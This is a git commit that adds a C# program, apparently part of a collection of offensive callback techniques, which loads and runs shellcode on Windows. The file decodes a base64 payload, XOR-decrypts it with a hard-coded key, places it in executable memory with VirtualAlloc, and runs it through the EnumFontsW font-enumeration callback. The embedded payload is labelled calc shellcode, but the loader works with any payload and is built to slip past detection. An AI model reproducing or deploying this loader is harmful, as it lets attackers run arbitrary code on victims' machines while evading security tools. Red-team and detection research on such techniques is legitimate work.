196df974db2f5ef91f19c0d7622fdc9ffe318f5d
Will Summerhill <35749735+wsummerhill@users.noreply.github.com>
2024-02-07 15:10:48 -0800

    Create CSharp-Callback_EnumFontsW.cs

---
+++ CSharp-Callback_EnumFontsW.cs
@@ -0,0 +1,51 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace AltCallbacks
+{
+    class Callback
+    {
+        const uint MEM_COMMIT = 0x00001000;
+        const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+        [DllImport("kernelbase.dll")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);
+
+        [DllImport("gdi32.dll")]
+        static extern int EnumFontsW(IntPtr hdc, [MarshalAs(UnmanagedType.LPWStr)] string lpLogfont, IntPtr lpProc, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetDCEx(IntPtr hWnd, IntPtr hRgnClip, uint flags);
+        
+        [DllImport("user32.dll")]
+        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+        static string key = "THISISMYKEY";
+
+        static void Main(string[] args)
+        {
+            // Calc shellcode
+            string base64 = @"qADKt7m7jVlLRRgFCRkBGAUFaJkgEd8aKRvCAVURwBd5HMM7AwFc+hMBCGidAHiT5W8sJUlpeRWJgF4IUoy7phcYBQDCAWnYD2UDRInfyMFTSVMF3IsxPhxJmQPCG1UdwAV5HUmZsB8bspAKzm3cAEiFBGKEEXqF9RWJgF4IUoxhqzCoGEsFd0EWdIg+nQEQwwl3AFKdPwrOVRwMwhNVGkyJCs5d3ABIgwgLDAEVHAMVEAgKCAkF2qdlGAa3qQsIChcRwFewA7e2rBQb91hLRVlUSElTAd7AWEpFWRXyeNgm1LKM8KVEfkII6e/G8MS0kBHXjGFvTy9H2bClLFHzDkA7PCdZEgTQjrecMCg/LncuPTxU";
+
+            byte[] decoded = Convert.FromBase64String(base64);
+            byte[] shellcode = new byte[decoded.Length];
+
+            for (int i = 0; i < decoded.Length; i++)
+                shellcode[i] = ((byte)(decoded[i] ^ key[(i % key.Length)]));
+
+            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+            Marshal.Copy(shellcode, 0, p, shellcode.Length);
+
+            IntPtr dc = GetDCEx(IntPtr.Zero, IntPtr.Zero, 0);
+
+            // Callback function
+            EnumFontsW(dc, null, p, IntPtr.Zero);
+
+            ReleaseDC(IntPtr.Zero, dc);
+
+            return;
+        }
+    }
+}
